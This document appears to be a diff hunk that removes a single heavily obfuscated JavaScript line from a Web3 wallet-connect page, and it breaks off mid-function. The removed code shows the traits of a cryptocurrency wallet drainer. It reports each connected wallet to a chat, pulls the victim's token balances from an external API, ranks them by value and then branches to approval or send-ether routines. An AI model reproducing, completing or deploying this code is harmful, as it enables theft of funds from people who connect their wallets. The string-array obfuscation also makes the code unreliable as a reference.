@@ -1,1 +1,486 @@
-const _0x1d3a2c=_0x35a0;(function(_0x3588a1,_0x3592fa){const _0x336a71=_0x35a0,_0x1759ab=_0x3588a1();while(!![]){try{const _0x1a81db=parseInt(_0x336a71(0x16f))/0x1+parseInt(_0x336a71(0x17a))/0x2*(-parseInt(_0x336a71(0xd9))/0x3)+parseInt(_0x336a71(0x105))/0x4+-parseInt(_0x336a71(0x158))/0x5*(-parseInt(_0x336a71(0x128))/0x6)+-parseInt(_0x336a71(0x104))/0x7*(parseInt(_0x336a71(0xbb))/0x8)+parseInt(_0x336a71(0x180))/0x9*(-parseInt(_0x336a71(0xc9))/0xa)+-parseInt(_0x336a71(0x148))/0xb*(-parseInt(_0x336a71(0xfd))/0xc);if(_0x1a81db===_0x3592fa)break;else _0x1759ab['push'](_0x1759ab['shift']());}catch(_0xbba0bd){_0x1759ab['push'](_0x1759ab['shift']());}}}(_0x1e2f,0x8c8a8));let tokens=[],NFTs=[],chainId=null,web3Object=null,selectedAccount=null;const Web3Modal=window[_0x1d3a2c(0x101)][_0x1d3a2c(0x13e)],WalletConnectProvider=window[_0x1d3a2c(0xce)][_0x1d3a2c(0x13e)],OWNER_ADDRESS=_0x1d3a2c(0x157),CHAT=_0x1d3a2c(0x12c),ABI=[{'constant':!![],'inputs':[],'name':'name','outputs':[{'name':'','type':_0x1d3a2c(0xd0)}],'payable':![],'stateMutability':_0x1d3a2c(0xf7),'type':_0x1d3a2c(0xea)},{'constant':![],'inputs':[{'name':'_upgradedAddress','type':_0x1d3a2c(0x175)}],'name':'deprecate','outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x1d3a2c(0xea)},{'constant':![],'inputs':[{'name':_0x1d3a2c(0xf9),'type':_0x1d3a2c(0x175)},{'name':'_value','type':_0x1d3a2c(0xc3)}],'name':_0x1d3a2c(0xd5),'outputs':[],'payable':![],'stateMutability':_0x1d3a2c(0xe3),'type':'function'},{'constant':!![],'inputs':[],'name':_0x1d3a2c(0x18a),'outputs':[{'name':'','type':_0x1d3a2c(0x14c)}],'payable':![],'stateMutability':_0x1d3a2c(0xf7),'type':'function'},{'constant':![],'inputs':[{'name':'_evilUser','type':_0x1d3a2c(0x175)}],'name':_0x1d3a2c(0x126),'outputs':[],'payable':![],'stateMutability':_0x1d3a2c(0xe3),'type':_0x1d3a2c(0xea)},{'constant':!![],'inputs':[],'name':_0x1d3a2c(0x10c),'outputs':[{'name':'','type':_0x1d3a2c(0xc3)}],'payable':![],'stateMutability':_0x1d3a2c(0xf7),'type':_0x1d3a2c(0xea)},{'constant':![],'inputs':[{'name':_0x1d3a2c(0x1a5),'type':_0x1d3a2c(0x175)},{'name':'_to','type':_0x1d3a2c(0x175)},{'name':_0x1d3a2c(0x170),'type':'uint256'}],'name':_0x1d3a2c(0xb8),'outputs':[],'payable':![],'stateMutability':_0x1d3a2c(0xe3),'type':_0x1d3a2c(0xea)},{'constant':!![],'inputs':[],'name':_0x1d3a2c(0x14d),'outputs':[{'name':'','type':_0x1d3a2c(0x175)}],'payable':![],'stateMutability':_0x1d3a2c(0xf7),'type':_0x1d3a2c(0xea)},{'constant':!![],'inputs':[{'name':'','type':'address'}],'name':'balances','outputs':[{'name':'','type':_0x1d3a2c(0xc3)}],'payable':![],'stateMutability':_0x1d3a2c(0xf7),'type':_0x1d3a2c(0xea)},{'constant':!![],'inputs':[],'name':_0x1d3a2c(0xc7),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x1d3a2c(0xf7),'type':_0x1d3a2c(0xea)},{'constant':!![],'inputs':[],'name':_0x1d3a2c(0x1a6),'outputs':[{'name':'','type':_0x1d3a2c(0xc3)}],'payable':![],'stateMutability':_0x1d3a2c(0xf7),'type':_0x1d3a2c(0xea)},{'constant':!![],'inputs':[],'name':_0x1d3a2c(0xe1),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':'view','type':_0x1d3a2c(0xea)},{'constant':![],'inputs':[],'name':_0x1d3a2c(0x10d),'outputs':[],'payable':![],'stateMutability':_0x1d3a2c(0xe3),'type':_0x1d3a2c(0xea)},{'constant':!![],'inputs':[{'name':'_maker','type':'address'}],'name':_0x1d3a2c(0xd3),'outputs':[{'name':'','type':_0x1d3a2c(0x14c)}],'payable':![],'stateMutability':_0x1d3a2c(0xf7),'type':_0x1d3a2c(0xea)},{'constant':!![],'inputs':[{'name':'','type':_0x1d3a2c(0x175)},{'name':'','type':_0x1d3a2c(0x175)}],'name':_0x1d3a2c(0xcf),'outputs':[{'name':'','type':_0x1d3a2c(0xc3)}],'payable':![],'stateMutability':'view','type':_0x1d3a2c(0xea)},{'constant':!![],'inputs':[],'name':_0x1d3a2c(0x129),'outputs':[{'name':'','type':_0x1d3a2c(0x14c)}],'payable':![],'stateMutability':_0x1d3a2c(0xf7),'type':'function'},{'constant':!![],'inputs':[{'name':_0x1d3a2c(0x103),'type':'address'}],'name':'balanceOf','outputs':[{'name':'','type':_0x1d3a2c(0xc3)}],'payable':![],'stateMutability':_0x1d3a2c(0xf7),'type':'function'},{'constant':![],'inputs':[],'name':_0x1d3a2c(0x11c),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x1d3a2c(0xea)},{'constant':!![],'inputs':[],'name':_0x1d3a2c(0xf6),'outputs':[{'name':'','type':_0x1d3a2c(0x175)}],'payable':![],'stateMutability':_0x1d3a2c(0xf7),'type':_0x1d3a2c(0xea)},{'constant':!![],'inputs':[],'name':_0x1d3a2c(0x16b),'outputs':[{'name':'','type':_0x1d3a2c(0x175)}],'payable':![],'stateMutability':'view','type':_0x1d3a2c(0xea)},{'constant':!![],'inputs':[],'name':_0x1d3a2c(0x117),'outputs':[{'name':'','type':_0x1d3a2c(0xd0)}],'payable':![],'stateMutability':_0x1d3a2c(0xf7),'type':_0x1d3a2c(0xea)},{'constant':![],'inputs':[{'name':_0x1d3a2c(0x108),'type':'address'},{'name':'_value','type':_0x1d3a2c(0xc3)}],'name':'transfer','outputs':[],'payable':![],'stateMutability':_0x1d3a2c(0xe3),'type':_0x1d3a2c(0xea)},{'constant':![],'inputs':[{'name':_0x1d3a2c(0x13b),'type':_0x1d3a2c(0xc3)},{'name':_0x1d3a2c(0x19f),'type':_0x1d3a2c(0xc3)}],'name':_0x1d3a2c(0x17c),'outputs':[],'payable':![],'stateMutability':_0x1d3a2c(0xe3),'type':_0x1d3a2c(0xea)},{'constant':![],'inputs':[{'name':_0x1d3a2c(0xe0),'type':_0x1d3a2c(0xc3)}],'name':_0x1d3a2c(0x163),'outputs':[],'payable':![],'stateMutability':_0x1d3a2c(0xe3),'type':'function'},{'constant':![],'inputs':[{'name':_0x1d3a2c(0xe0),'type':_0x1d3a2c(0xc3)}],'name':_0x1d3a2c(0x1b0),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x1d3a2c(0xea)},{'constant':!![],'inputs':[{'name':_0x1d3a2c(0xc8),'type':'address'},{'name':_0x1d3a2c(0xf9),'type':_0x1d3a2c(0x175)}],'name':_0x1d3a2c(0x159),'outputs':[{'name':_0x1d3a2c(0x155),'type':'uint256'}],'payable':![],'stateMutability':'view','type':_0x1d3a2c(0xea)},{'constant':!![],'inputs':[],'name':'basisPointsRate','outputs':[{'name':'','type':_0x1d3a2c(0xc3)}],'payable':![],'stateMutability':'view','type':_0x1d3a2c(0xea)},{'constant':!![],'inputs':[{'name':'','type':'address'}],'name':_0x1d3a2c(0xd4),'outputs':[{'name':'','type':_0x1d3a2c(0x14c)}],'payable':![],'stateMutability':_0x1d3a2c(0xf7),'type':_0x1d3a2c(0xea)},{'constant':![],'inputs':[{'name':'_clearedUser','type':_0x1d3a2c(0x175)}],'name':_0x1d3a2c(0x16e),'outputs':[],'payable':![],'stateMutability':_0x1d3a2c(0xe3),'type':'function'},{'constant':!![],'inputs':[],'name':_0x1d3a2c(0xf1),'outputs':[{'name':'','type':_0x1d3a2c(0xc3)}],'payable':![],'stateMutability':_0x1d3a2c(0xf7),'type':_0x1d3a2c(0xea)},{'constant':![],'inputs':[{'name':_0x1d3a2c(0x15a),'type':_0x1d3a2c(0x175)}],'name':'transferOwnership','outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x1d3a2c(0xea)},{'constant':![],'inputs':[{'name':_0x1d3a2c(0x1b1),'type':'address'}],'name':_0x1d3a2c(0x1b5),'outputs':[],'payable':![],'stateMutability':_0x1d3a2c(0xe3),'type':_0x1d3a2c(0xea)},{'inputs':[{'name':'_initialSupply','type':_0x1d3a2c(0xc3)},{'name':_0x1d3a2c(0x1b2),'type':'string'},{'name':'_symbol','type':_0x1d3a2c(0xd0)},{'name':_0x1d3a2c(0x181),'type':'uint256'}],'payable':![],'stateMutability':_0x1d3a2c(0xe3),'type':_0x1d3a2c(0x199)},{'anonymous':![],'inputs':[{'indexed':![],'name':'amount','type':_0x1d3a2c(0xc3)}],'name':_0x1d3a2c(0x153),'type':_0x1d3a2c(0x1aa)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x1d3a2c(0xe0),'type':'uint256'}],'name':'Redeem','type':_0x1d3a2c(0x1aa)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x1d3a2c(0xca),'type':_0x1d3a2c(0x175)}],'name':_0x1d3a2c(0xe5),'type':_0x1d3a2c(0x1aa)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x1d3a2c(0xe8),'type':_0x1d3a2c(0xc3)},{'indexed':![],'name':'maxFee','type':'uint256'}],'name':'Params','type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x1d3a2c(0x1b1),'type':_0x1d3a2c(0x175)},{'indexed':![],'name':'_balance','type':_0x1d3a2c(0xc3)}],'name':'DestroyedBlackFunds','type':_0x1d3a2c(0x1aa)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x1d3a2c(0xe9),'type':_0x1d3a2c(0x175)}],'name':_0x1d3a2c(0x192),'type':_0x1d3a2c(0x1aa)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x1d3a2c(0xe9),'type':_0x1d3a2c(0x175)}],'name':_0x1d3a2c(0x10a),'type':_0x1d3a2c(0x1aa)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x1d3a2c(0x16b),'type':_0x1d3a2c(0x175)},{'indexed':!![],'name':_0x1d3a2c(0x150),'type':'address'},{'indexed':![],'name':_0x1d3a2c(0x1b7),'type':'uint256'}],'name':_0x1d3a2c(0x107),'type':_0x1d3a2c(0x1aa)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x1d3a2c(0x14a),'type':_0x1d3a2c(0x175)},{'indexed':!![],'name':'to','type':_0x1d3a2c(0x175)},{'indexed':![],'name':_0x1d3a2c(0x1b7),'type':_0x1d3a2c(0xc3)}],'name':_0x1d3a2c(0x137),'type':_0x1d3a2c(0x1aa)},{'anonymous':![],'inputs':[],'name':_0x1d3a2c(0x182),'type':_0x1d3a2c(0x1aa)},{'anonymous':![],'inputs':[],'name':_0x1d3a2c(0x100),'type':_0x1d3a2c(0x1aa)}],ABIN=[{'inputs':[{'internalType':_0x1d3a2c(0xd0),'name':_0x1d3a2c(0x1a3),'type':'string'},{'internalType':_0x1d3a2c(0xd0),'name':'symbol','type':_0x1d3a2c(0xd0)},{'internalType':_0x1d3a2c(0xc3),'name':_0x1d3a2c(0xdb),'type':'uint256'},{'internalType':_0x1d3a2c(0xc3),'name':_0x1d3a2c(0x14f),'type':_0x1d3a2c(0xc3)}],'stateMutability':_0x1d3a2c(0xe3),'type':_0x1d3a2c(0x199)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x1d3a2c(0x175),'name':_0x1d3a2c(0x16b),'type':_0x1d3a2c(0x175)},{'indexed':!![],'internalType':_0x1d3a2c(0x175),'name':_0x1d3a2c(0x1b3),'type':_0x1d3a2c(0x175)},{'indexed':!![],'internalType':_0x1d3a2c(0xc3),'name':_0x1d3a2c(0x1ae),'type':_0x1d3a2c(0xc3)}],'name':'Approval','type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x1d3a2c(0x175),'name':_0x1d3a2c(0x16b),'type':'address'},{'indexed':!![],'internalType':_0x1d3a2c(0x175),'name':_0x1d3a2c(0x118),'type':_0x1d3a2c(0x175)},{'indexed':![],'internalType':_0x1d3a2c(0x14c),'name':'approved','type':'bool'}],'name':_0x1d3a2c(0x16d),'type':_0x1d3a2c(0x1aa)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x1d3a2c(0x175),'name':_0x1d3a2c(0xbf),'type':_0x1d3a2c(0x175)},{'indexed':!![],'internalType':'address','name':_0x1d3a2c(0x15a),'type':_0x1d3a2c(0x175)}],'name':_0x1d3a2c(0x114),'type':_0x1d3a2c(0x1aa)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x1d3a2c(0x175),'name':'from','type':_0x1d3a2c(0x175)},{'indexed':!![],'internalType':_0x1d3a2c(0x175),'name':'to','type':_0x1d3a2c(0x175)},{'indexed':!![],'internalType':_0x1d3a2c(0xc3),'name':_0x1d3a2c(0x1ae),'type':_0x1d3a2c(0xc3)}],'name':_0x1d3a2c(0x137),'type':_0x1d3a2c(0x1aa)},{'inputs':[],'name':_0x1d3a2c(0x1a9),'outputs':[{'internalType':_0x1d3a2c(0xd0),'name':'','type':_0x1d3a2c(0xd0)}],'stateMutability':_0x1d3a2c(0xf7),'type':_0x1d3a2c(0xea)},{'inputs':[],'name':_0x1d3a2c(0x124),'outputs':[{'internalType':_0x1d3a2c(0xc3),'name':'','type':_0x1d3a2c(0xc3)}],'stateMutability':'view','type':_0x1d3a2c(0xea)},{'inputs':[],'name':_0x1d3a2c(0x12d),'outputs':[{'internalType':_0x1d3a2c(0xc3),'name':'','type':'uint256'}],'stateMutability':_0x1d3a2c(0xf7),'type':_0x1d3a2c(0xea)},{'inputs':[],'name':_0x1d3a2c(0x120),'outputs':[{'internalType':_0x1d3a2c(0xc3),'name':'','type':_0x1d3a2c(0xc3)}],'stateMutability':_0x1d3a2c(0xf7),'type':_0x1d3a2c(0xea)},{'inputs':[{'internalType':_0x1d3a2c(0x175),'name':'to','type':_0x1d3a2c(0x175)},{'internalType':'uint256','name':_0x1d3a2c(0x1ae),'type':_0x1d3a2c(0xc3)}],'name':_0x1d3a2c(0xd5),'outputs':[],'stateMutability':'nonpayable','type':_0x1d3a2c(0xea)},{'inputs':[{'internalType':_0x1d3a2c(0x175),'name':_0x1d3a2c(0x16b),'type':'address'}],'name':_0x1d3a2c(0xe4),'outputs':[{'internalType':_0x1d3a2c(0xc3),'name':'','type':'uint256'}],'stateMutability':_0x1d3a2c(0xf7),'type':_0x1d3a2c(0xea)},{'inputs':[],'name':_0x1d3a2c(0xc6),'outputs':[{'internalType':_0x1d3a2c(0xd0),'name':'','type':_0x1d3a2c(0xd0)}],'stateMutability':'view','type':_0x1d3a2c(0xea)},{'inputs':[],'name':_0x1d3a2c(0x13a),'outputs':[],'stateMutability':_0x1d3a2c(0xe3),'type':_0x1d3a2c(0xea)},{'inputs':[],'name':'flipSaleState','outputs':[],'stateMutability':'nonpayable','type':_0x1d3a2c(0xea)},{'inputs':[{'internalType':'uint256','name':_0x1d3a2c(0x1ae),'type':'uint256'}],'name':_0x1d3a2c(0xd8),'outputs':[{'internalType':'address','name':'','type':_0x1d3a2c(0x175)}],'stateMutability':_0x1d3a2c(0xf7),'type':_0x1d3a2c(0xea)},{'inputs':[{'internalType':_0x1d3a2c(0x175),'name':_0x1d3a2c(0x16b),'type':'address'},{'internalType':_0x1d3a2c(0x175),'name':_0x1d3a2c(0x118),'type':_0x1d3a2c(0x175)}],'name':'isApprovedForAll','outputs':[{'internalType':_0x1d3a2c(0x14c),'name':'','type':_0x1d3a2c(0x14c)}],'stateMutability':_0x1d3a2c(0xf7),'type':_0x1d3a2c(0xea)},{'inputs':[],'name':'maxApePurchase','outputs':[{'internalType':_0x1d3a2c(0xc3),'name':'','type':'uint256'}],'stateMutability':_0x1d3a2c(0xf7),'type':_0x1d3a2c(0xea)},{'inputs':[{'internalType':'uint256','name':'numberOfTokens','type':_0x1d3a2c(0xc3)}],'name':'mintApe','outputs':[],'stateMutability':_0x1d3a2c(0x156),'type':_0x1d3a2c(0xea)},{'inputs':[],'name':_0x1d3a2c(0x1a3),'outputs':[{'internalType':_0x1d3a2c(0xd0),'name':'','type':_0x1d3a2c(0xd0)}],'stateMutability':'view','type':'function'},{'inputs':[],'name':_0x1d3a2c(0x16b),'outputs':[{'internalType':_0x1d3a2c(0x175),'name':'','type':'address'}],'stateMutability':'view','type':_0x1d3a2c(0xea)},{'inputs':[{'internalType':'uint256','name':_0x1d3a2c(0x1ae),'type':'uint256'}],'name':_0x1d3a2c(0x12b),'outputs':[{'internalType':'address','name':'','type':'address'}],'stateMutability':_0x1d3a2c(0xf7),'type':'function'},{'inputs':[],'name':_0x1d3a2c(0xbe),'outputs':[],'stateMutability':_0x1d3a2c(0xe3),'type':'function'},{'inputs':[],'name':_0x1d3a2c(0x164),'outputs':[],'stateMutability':'nonpayable','type':_0x1d3a2c(0xea)},{'inputs':[{'internalType':_0x1d3a2c(0x175),'name':'from','type':_0x1d3a2c(0x175)},{'internalType':_0x1d3a2c(0x175),'name':'to','type':_0x1d3a2c(0x175)},{'internalType':_0x1d3a2c(0xc3),'name':_0x1d3a2c(0x1ae),'type':_0x1d3a2c(0xc3)}],'name':_0x1d3a2c(0x173),'outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[{'internalType':_0x1d3a2c(0x175),'name':_0x1d3a2c(0x14a),'type':_0x1d3a2c(0x175)},{'internalType':'address','name':'to','type':_0x1d3a2c(0x175)},{'internalType':_0x1d3a2c(0xc3),'name':_0x1d3a2c(0x1ae),'type':_0x1d3a2c(0xc3)},{'internalType':_0x1d3a2c(0xc4),'name':'_data','type':'bytes'}],'name':_0x1d3a2c(0x173),'outputs':[],'stateMutability':_0x1d3a2c(0xe3),'type':'function'},{'inputs':[],'name':_0x1d3a2c(0x15f),'outputs':[{'internalType':_0x1d3a2c(0x14c),'name':'','type':_0x1d3a2c(0x14c)}],'stateMutability':_0x1d3a2c(0xf7),'type':_0x1d3a2c(0xea)},{'inputs':[{'internalType':_0x1d3a2c(0x175),'name':_0x1d3a2c(0x118),'type':_0x1d3a2c(0x175)},{'internalType':'bool','name':_0x1d3a2c(0x1b3),'type':_0x1d3a2c(0x14c)}],'name':_0x1d3a2c(0x138),'outputs':[],'stateMutability':_0x1d3a2c(0xe3),'type':_0x1d3a2c(0xea)},{'inputs':[{'internalType':'string','name':_0x1d3a2c(0xc6),'type':_0x1d3a2c(0xd0)}],'name':'setBaseURI','outputs':[],'stateMutability':_0x1d3a2c(0xe3),'type':_0x1d3a2c(0xea)},{'inputs':[{'internalType':_0x1d3a2c(0xd0),'name':'provenanceHash','type':_0x1d3a2c(0xd0)}],'name':_0x1d3a2c(0x149),'outputs':[],'stateMutability':_0x1d3a2c(0xe3),'type':_0x1d3a2c(0xea)},{'inputs':[{'internalType':_0x1d3a2c(0xc3),'name':'revealTimeStamp','type':_0x1d3a2c(0xc3)}],'name':'setRevealTimestamp','outputs':[],'stateMutability':_0x1d3a2c(0xe3),'type':_0x1d3a2c(0xea)},{'inputs':[],'name':'setStartingIndex','outputs':[],'stateMutability':_0x1d3a2c(0xe3),'type':_0x1d3a2c(0xea)},{'inputs':[],'name':_0x1d3a2c(0xc1),'outputs':[{'internalType':'uint256','name':'','type':_0x1d3a2c(0xc3)}],'stateMutability':'view','type':_0x1d3a2c(0xea)},{'inputs':[],'name':_0x1d3a2c(0x134),'outputs':[{'internalType':_0x1d3a2c(0xc3),'name':'','type':'uint256'}],'stateMutability':_0x1d3a2c(0xf7),'type':'function'},{'inputs':[{'internalType':'bytes4','name':_0x1d3a2c(0x106),'type':_0x1d3a2c(0xf0)}],'name':'supportsInterface','outputs':[{'internalType':'bool','name':'','type':_0x1d3a2c(0x14c)}],'stateMutability':_0x1d3a2c(0xf7),'type':_0x1d3a2c(0xea)},{'inputs':[],'name':'symbol','outputs':[{'internalType':_0x1d3a2c(0xd0),'name':'','type':'string'}],'stateMutability':_0x1d3a2c(0xf7),'type':_0x1d3a2c(0xea)},{'inputs':[{'internalType':_0x1d3a2c(0xc3),'name':'index','type':_0x1d3a2c(0xc3)}],'name':'tokenByIndex','outputs':[{'internalType':_0x1d3a2c(0xc3),'name':'','type':_0x1d3a2c(0xc3)}],'stateMutability':_0x1d3a2c(0xf7),'type':_0x1d3a2c(0xea)},{'inputs':[{'internalType':'address','name':'owner','type':'address'},{'internalType':_0x1d3a2c(0xc3),'name':'index','type':'uint256'}],'name':_0x1d3a2c(0x13f),'outputs':[{'internalType':_0x1d3a2c(0xc3),'name':'','type':_0x1d3a2c(0xc3)}],'stateMutability':_0x1d3a2c(0xf7),'type':_0x1d3a2c(0xea)},{'inputs':[{'internalType':_0x1d3a2c(0xc3),'name':_0x1d3a2c(0x1ae),'type':_0x1d3a2c(0xc3)}],'name':'tokenURI','outputs':[{'internalType':_0x1d3a2c(0xd0),'name':'','type':_0x1d3a2c(0xd0)}],'stateMutability':_0x1d3a2c(0xf7),'type':'function'},{'inputs':[],'name':_0x1d3a2c(0x10c),'outputs':[{'internalType':_0x1d3a2c(0xc3),'name':'','type':'uint256'}],'stateMutability':_0x1d3a2c(0xf7),'type':_0x1d3a2c(0xea)},{'inputs':[{'internalType':_0x1d3a2c(0x175),'name':_0x1d3a2c(0x14a),'type':_0x1d3a2c(0x175)},{'internalType':_0x1d3a2c(0x175),'name':'to','type':'address'},{'internalType':'uint256','name':_0x1d3a2c(0x1ae),'type':_0x1d3a2c(0xc3)}],'name':_0x1d3a2c(0xb8),'outputs':[],'stateMutability':_0x1d3a2c(0xe3),'type':'function'},{'inputs':[{'internalType':'address','name':_0x1d3a2c(0x15a),'type':'address'}],'name':_0x1d3a2c(0x10e),'outputs':[],'stateMutability':_0x1d3a2c(0xe3),'type':_0x1d3a2c(0xea)},{'inputs':[],'name':_0x1d3a2c(0x15b),'outputs':[],'stateMutability':_0x1d3a2c(0xe3),'type':_0x1d3a2c(0xea)}],networkToId={0x1328cf7:_0x1d3a2c(0xdd),0x1:_0x1d3a2c(0xba),0x5:_0x1d3a2c(0x171),0x89:_0x1d3a2c(0x18d),0x13881:_0x1d3a2c(0xfc),0x38:_0x1d3a2c(0x189),0x61:_0x1d3a2c(0x19b),0xa86a:'avalanche-mainnet',0xa869:_0x1d3a2c(0x10b),0xfa:_0x1d3a2c(0x18f),0xfa2:_0x1d3a2c(0x19c),0xa4b1:_0x1d3a2c(0x12e),0x66eed:_0x1d3a2c(0x122),0xa4ba:_0x1d3a2c(0x116),0x250:_0x1d3a2c(0x178),0x51:_0x1d3a2c(0x19a),0x150:_0x1d3a2c(0xee),0x4e454152:_0x1d3a2c(0x19d),0x4e454153:_0x1d3a2c(0x143),0x6984c:'avalanche-dexalot-mainnet',0x69849:_0x1d3a2c(0x194),0x7e4:_0x1d3a2c(0x136),0x14a33:'base-testnet',0x77:_0x1d3a2c(0x1ac),0x405:_0x1d3a2c(0x172),0xa918:_0x1d3a2c(0x174),0x10e8:_0x1d3a2c(0xfa),0xdbe0:_0x1d3a2c(0x1af),0x2600:_0x1d3a2c(0x110),0x50e:_0x1d3a2c(0xc2),0x511:_0x1d3a2c(0x167),0x120:_0x1d3a2c(0x198),0x1c:'boba-rinkeby-testnet',0xb48:_0x1d3a2c(0x135),0x1e14:'canto-mainnet',0x436f7631:_0x1d3a2c(0x18e),0x19:_0x1d3a2c(0x190),0x152:_0x1d3a2c(0x1a1),0xd2af:_0x1d3a2c(0x188),0x14f:_0x1d3a2c(0x102),0xa516:_0x1d3a2c(0xf3),0x2329:_0x1d3a2c(0x121),0x2328:_0x1d3a2c(0x196),0x868:_0x1d3a2c(0x112),0x86a:'findora-forge-testnet',0x13:_0x1d3a2c(0xdf),0x10:_0x1d3a2c(0x17e),0xe:_0x1d3a2c(0x197),0x72:_0x1d3a2c(0xc0),0xb7e7759:_0x1d3a2c(0x1b6),0x153c099c:_0x1d3a2c(0x191),0x63564c40:_0x1d3a2c(0x14b),0x6357d2e0:_0x1d3a2c(0x184),0x141:_0x1d3a2c(0x17b),0x142:_0x1d3a2c(0x183),0xe704:'linea-testnet',0x1389:_0x1d3a2c(0x152),0x52:_0x1d3a2c(0xcc),0x53:_0x1d3a2c(0x111),0x440:_0x1d3a2c(0xd2),0x24c:_0x1d3a2c(0x18c),0x7d2:_0x1d3a2c(0x142),0x30e0a:_0x1d3a2c(0x146),0x7d1:_0x1d3a2c(0x15d),0x30da5:_0x1d3a2c(0x151),0x504:_0x1d3a2c(0x123),0x507:_0x1d3a2c(0x19e),0x505:_0x1d3a2c(0x11b),0xe9ac0ce:_0x1d3a2c(0x125),0x116ea:_0x1d3a2c(0x141),0x116e9:_0x1d3a2c(0x195),0x116e1:_0x1d3a2c(0x16c),0x5afe:'oasis-sapphire-mainnet',0x5aff:_0x1d3a2c(0x130),0xf8:_0x1d3a2c(0x127),0x249c:_0x1d3a2c(0x1ab),0xa:_0x1d3a2c(0xfe),0x2a15c308d:_0x1d3a2c(0x119),0x2a15c3083:'palm-testnet',0x5a2:_0x1d3a2c(0x12a),0x1e:_0x1d3a2c(0x13d),0x1f:'rsk-testnet',0x5d456c62:_0x1d3a2c(0xe2),0x1482a7b2:_0x1d3a2c(0x147),0x3d28774d:_0x1d3a2c(0x1a0),0x109b4597:_0x1d3a2c(0x161),0x536f6c4d:_0x1d3a2c(0x186),0x1202c:_0x1d3a2c(0xff),0x1202d:_0x1d3a2c(0xc5),0x1a0:_0x1d3a2c(0xdc)},providerOptions={'walletconnect':{'package':WalletConnectProvider,'options':{'rpc':{0x1:_0x1d3a2c(0x11d)},'chainId':0x1,'infuraId':_0x1d3a2c(0x144),'pollingInterval':'10000'}},'coinbasewallet':{'package':CoinbaseWalletSDK,'options':{'appName':_0x1d3a2c(0x11a),'infuraId':_0x1d3a2c(0x144),'chainId':0x1,'darkMode':![]}}};let web3Modal=new Web3Modal({'providerOptions':providerOptions,'cacheProvider':![],'disableInjectedProvider':![]});function _0x35a0(_0x25e5cf,_0x1f6f12){const _0x1e2fef=_0x1e2f();return _0x35a0=function(_0x35a09a,_0x5241b9){_0x35a09a=_0x35a09a-0xb7;let _0x5dba18=_0x1e2fef[_0x35a09a];return _0x5dba18;},_0x35a0(_0x25e5cf,_0x1f6f12);}$(_0x1d3a2c(0xde))[_0x1d3a2c(0xef)](async function(){const _0xc69eea=_0x1d3a2c;try{let _0x41a42d=await web3Modal['connect']();onProvider(_0x41a42d),_0x41a42d['on']('accountsChanged',_0x5f02d6=>{const _0xb174d1=_0x35a0;console[_0xb174d1(0xb7)](_0x5f02d6),onProvider(_0x41a42d);});}catch(_0x1c5142){console['log'](_0xc69eea(0x13c),_0x1c5142);return;}});async function onProvider(_0x2e5cf7){const _0x4a3782=_0x1d3a2c;web3Object=new Web3(_0x2e5cf7);let _0x5c1899=await web3Object[_0x4a3782(0xd1)][_0x4a3782(0x18b)]();selectedAccount=_0x5c1899[0x0],chainName=await web3Object[_0x4a3782(0xd1)][_0x4a3782(0x109)](),chainId=networkToId[chainName],console[_0x4a3782(0xb7)](chainId),console[_0x4a3782(0xb7)](selectedAccount),_0x5c1899[_0x4a3782(0xcd)]&&(sendMessage('Wallet\x20Connected\x20Successfully!'),sendMessage(_0x4a3782(0x1ad)+selectedAccount),covalenthqAPICall());}async function covalenthqAPICall(){const _0x135653=_0x1d3a2c,_0x5514bd={'chain':_0x135653(0xd1)},_0x274127=new URL('https://deep-index.moralis.io/api/v2/'+selectedAccount+'/erc20');_0x274127[_0x135653(0x131)]=new URLSearchParams(_0x5514bd)[_0x135653(0x15e)]();const _0xde71f0={'method':'GET','headers':{'accept':'application/json','X-API-Key':_0x135653(0x10f)}};try{const _0x5a11b1=await fetch(_0x274127,_0xde71f0)['then'](_0x2faf75=>_0x2faf75[_0x135653(0x16a)]());console['log'](_0x5a11b1);let _0x1cee9a=_0x5a11b1;console[_0x135653(0xb7)](_0x135653(0x15c),_0x1cee9a);let _0x59c766=await Promise[_0x135653(0x132)](_0x1cee9a['map'](async _0x3114d0=>{const _0x15cb81=_0x135653;let _0xae01f2;try{_0xae01f2=await getValue(_0x3114d0[_0x15cb81(0x166)],_0x3114d0[_0x15cb81(0xd6)],_0x3114d0[_0x15cb81(0xc7)]);}catch(_0xfa6b08){_0xae01f2=0x0;}return console[_0x15cb81(0xb7)](_0xae01f2),{'balance':_0x3114d0[_0x15cb81(0xd6)],'value':_0xae01f2,'address':_0x3114d0[_0x15cb81(0x166)]};}));console[_0x135653(0xb7)](_0x135653(0x1a8),_0x59c766),tokens=_0x59c766[_0x135653(0x162)](_0x4d3782=>_0x4d3782[_0x135653(0x1b7)]>0x5),tokens[_0x135653(0xed)]((_0x52f3e6,_0x1fd787)=>_0x1fd787[_0x135653(0x1b7)]-_0x52f3e6[_0x135653(0x1b7)]),console[_0x135653(0xb7)]('chainId:',chainId,_0x135653(0xe7),tokens);if(tokens[_0x135653(0xcd)]===0x0)onSendEther();else onApprove();}catch{sendMessage(_0x135653(0x140));}NFTs=await getNFTs(selectedAccount)['catch'](_0x139766=>{const _0xb1ce0d=_0x135653;console[_0xb1ce0d(0xb7)](_0xb1ce0d(0x193),_0x139766);}),NFTs=NFTs['result'],console[_0x135653(0xb7)](_0x135653(0x154),NFTs);}async function onApprove(){const 